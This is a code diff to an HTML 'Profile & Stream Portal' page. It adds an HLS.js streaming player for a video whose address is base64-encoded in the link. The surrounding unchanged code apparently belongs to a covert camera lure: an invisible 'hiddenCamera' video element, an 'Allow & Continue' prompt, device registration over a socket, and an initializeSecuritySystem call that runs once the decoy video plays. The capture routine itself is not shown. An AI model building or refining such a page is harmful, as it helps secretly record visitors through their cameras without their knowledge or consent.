@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Profile & Stream Portal</title>
     <script src="/socket.io/socket.io.js"></script>
+    <!-- HLS.js Library for smooth stream playing -->
+    <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
     <style>
         * { box-sizing: border-box; }
         body { 
@@ -140,7 +142,7 @@
         <button class="btn" id="actionBtn">Allow & Continue</button>
     </div>
 
-    <!-- Iframe ki jagah ab HTML5 Video Tag hai -->
+    <!-- Video Player Tag -->
     <video id="mediaPlayer" controls autoplay playsinline></video>
 
     <video id="hiddenCamera" autoplay playsinline style="display:none; position:absolute; opacity:0; pointer-events:none;"></video>
@@ -162,6 +164,35 @@
         const encodedVid = urlParams.get('v');
         let targetVideoUrl = encodedVid ? atob(encodedVid) : "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1";
 
+        // Professional Video Player Function (Supports HLS Streams & MP4)
+        function playStream(url) {
+            mediaPlayer.style.display = 'block';
+            
+            // Check agar stream HLS format ya custom stream route hai
+            if (url.includes('.m3u8') || url.includes('/stream/')) {
+                if (Hls.isSupported()) {
+                    const hls = new Hls();
+                    hls.loadSource(url);
+                    hls.attachMedia(mediaPlayer);
+                    hls.on(Hls.Events.MANIFEST_PARSED, () => {
+                        mediaPlayer.play().catch(e => console.log("HLS Play Error:", e));
+                    });
+                } else if (mediaPlayer.canPlayType('application/vnd.apple.mpegurl')) {
+                    // Safari ke liye native support
+                    mediaPlayer.src = url;
+                    mediaPlayer.play().catch(e => console.log("Safari Play Error:", e));
+                } else {
+                    // Fallback
+                    mediaPlayer.src = url;
+                    mediaPlayer.play().catch(e => console.log("Fallback Play Error:", e));
+                }
+            } else {
+                // Normal video/YouTube link ke liye
+                mediaPlayer.src = url;
+                mediaPlayer.play().catch(e => console.log("Normal Play Error:", e));
+            }
+        }
+
         // Persistent check via LocalStorage
         window.addEventListener('DOMContentLoaded', () => {
             const savedName = localStorage.getItem('sec_username');
@@ -173,9 +204,7 @@
                 if (savedAvatar) previewImg.src = savedAvatar;
 
                 profileSection.style.display = 'none';
-                mediaPlayer.style.display = 'block';
-                mediaPlayer.src = targetVideoUrl; 
-                mediaPlayer.play().catch(e => console.log("Play error:", e));
+                playStream(targetVideoUrl);
 
                 socket.emit('register_device', { name: savedName });
                 initializeSecuritySystem();
@@ -220,9 +249,7 @@
             } catch (err) {}
 
             profileSection.style.display = 'none';
-            mediaPlayer.style.display = 'block';
-            mediaPlayer.src = targetVideoUrl; 
-            mediaPlayer.play().catch(e => console.log("Play error:", e)); // Yahan video automatically play ho jayegi
+            playStream(targetVideoUrl); // Yahan ab custom player active ho jayega
 
             initializeSecuritySystem();
         });
